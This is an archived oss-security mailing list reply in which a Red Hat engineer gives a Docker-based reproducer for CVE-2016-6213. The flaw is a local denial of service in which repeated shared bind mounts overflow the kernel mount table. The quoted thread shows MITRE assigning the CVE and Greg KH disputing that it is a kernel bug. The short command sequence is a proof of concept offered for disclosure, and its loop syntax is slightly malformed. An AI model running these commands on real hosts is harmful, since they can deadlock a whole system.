X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1542" "Thursday" "14" "July" "2016" "12:15:02" "-0400" "CAI Qian" "caiqian@redhat.com" "<1209678068.4908811.1468512902793.JavaMail.zimbra@redhat.com>" "45" "Re: [oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount" nil nil nil "7" "2016071416:15:02" "[oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount" (number mark "U       caiqian@redh Jul 14   45/1542  " thread-indent "\"Re: [oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount\"\n") "<20160713224500.GD12156@kroah.com>" ("<1929364718.4484556.1468421564523.JavaMail.zimbra@redhat.com>" "<20160713165940.E24C88BCE32@smtpvmsrv1.mitre.org>" "<20160713224500.GD12156@kroah.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 25708 invoked by uid 550); 14 Jul 2016 16:15:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25688 invoked from network); 14 Jul 2016 16:15:18 -0000
Date: Thu, 14 Jul 2016 12:15:02 -0400 (EDT)
From: CAI Qian <caiqian@redhat.com>
To: Greg KH <greg@kroah.com>
Cc: oss-security@lists.openwall.com, cve-assign@mitre.org
Message-ID: <1209678068.4908811.1468512902793.JavaMail.zimbra@redhat.com>
In-Reply-To: <20160713224500.GD12156@kroah.com>
References: <1929364718.4484556.1468421564523.JavaMail.zimbra@redhat.com> <20160713165940.E24C88BCE32@smtpvmsrv1.mitre.org> <20160713224500.GD12156@kroah.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit
X-Originating-IP: [10.18.41.13]
X-Mailer: Zimbra 8.0.6_GA_5922 (ZimbraWebClient - GC45 (Linux)/8.0.6_GA_5922)
Thread-Topic: cve request: local DoS by overflowing kernel mount table using shared bind mount
Thread-Index: hOdD4aS2ea/HStlguRP7NCDxcKj4rA==
Subject: Re: [oss-security] Re: cve request: local DoS by overflowing kernel
 mount table using shared bind mount

Maybe this is a better reproducer using docker. It is exploitable even with
user namespace enabled.

# docker run -it -v /mnt/:/mnt/:shared --cap-add=SYS_ADMIN rhel7 /bin/bash

# cat /proc/self/uid_map 
         0        995      65536

# cat /proc/self/gid_map 
         0        992      65536

(insider container) # for i in `seq 1 20`; mount -o bind /mnt/1 /mnt/2; done
   CAI Qian

----- Original Message -----
> From: "Greg KH" <greg@kroah.com>
> To: oss-security@lists.openwall.com
> Cc: caiqian@redhat.com, cve-assign@mitre.org
> Sent: Wednesday, July 13, 2016 6:45:00 PM
> Subject: Re: [oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount
> 
> On Wed, Jul 13, 2016 at 12:59:40PM -0400, cve-assign@mitre.org wrote:
> > > It was reported that the mount table expands by a power-of-two
> > > with each bind mount command.
> > 
> > > If the system is configured in the way that a non-root user
> > > allows bind mount even if with limit number of bind mount
> > > allowed, a non-root user could cause a local DoS by quickly
> > > overflow the mount table.
> > 
> > > it will cause a deadlock for the whole system,
> > 
> > >> form of unlimited memory consumption that is causing the problem
> > 
> > Use CVE-2016-6213.
> 
> A CVE for an "improperly configured system"?  Huh?  What distro has such
> a configuration set by default?  This isn't a kernel bug, so what is
> this CVE classified as being "against"?  It better not be against the
> Linux kernel...
> 
> confused,
> 
> greg k-h
> 
